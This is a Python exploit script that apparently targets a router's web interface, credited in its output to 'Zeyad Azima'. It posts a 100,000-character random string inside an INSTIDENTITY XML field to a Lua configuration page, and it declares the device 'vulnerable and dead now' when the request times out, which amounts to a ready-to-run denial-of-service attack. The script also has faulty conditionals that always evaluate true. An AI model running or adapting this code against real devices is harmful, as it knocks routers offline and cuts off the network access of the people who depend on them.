import random
import string
import sys
import urllib3
import requests


urllib3.disable_warnings()


def attack(target, porot):

    url = f"{porot}://{target}/common_page/Localnet_WlanBasicAd_WLANSSIDConf_EncryOption_lua.lua"
    try:
        print("[+] Check if the target is alive")
        check = requests.get(url, timeout=10, verify=False)
        if check.status_code == 200 or 301 or 302 or 303:
            print("[+] Target is alive")
            print("[+] Sending your request...")
            create = string.ascii_uppercase
            payload = ''.join(random.choice(create) for i in range(100000))
            cookies = {"_TESTCOOKIESUPPORT": "1"}
            Headers = {"Connection": "close",
                       "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                       "Accept": "application/xml, text/xml, */*; q=0.01", "X-Requested-With": "XMLHttpRequest",
                       "sec-ch-ua-mobile": "?0",
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                       "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                       "Origin": "https://192.168.1.1", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
                       "Sec-Fetch-Dest": "empty", "Referer": "https://"+target+"/", "Accept-Encoding": "gzip, deflate",
                       "Accept-Language": "en-US,en;q=0.9"}
            Data = f"<ajax_response_xml_root><INSTIDENTITY>{payload}</INSTIDENTITY></ajax_response_xml_root>"
            try:
                att = requests.post(url, headers=Headers, cookies=cookies, data=Data, verify=False, timeout=5)
                print("[-] Target is not Vulnerable")
                sys.exit()
            except requests.exceptions.Timeout:
                print("[+] Target vulnerable and dead now")

            print("[+] Exploit by: Zeyad Azima")

        else:
            print("[-] Your Target is not Alive")
    except Exception as error:
        print("[-]", error)



try:
    if sys.argv[2] == "http" or "https":
        attack(sys.argv[1], sys.argv[2])
    else:
        print("[-] Please enter a valid protocol (http or https)")

except IndexError:
    print("[-] Please Set your target \n ex: exploit.py target protocol")
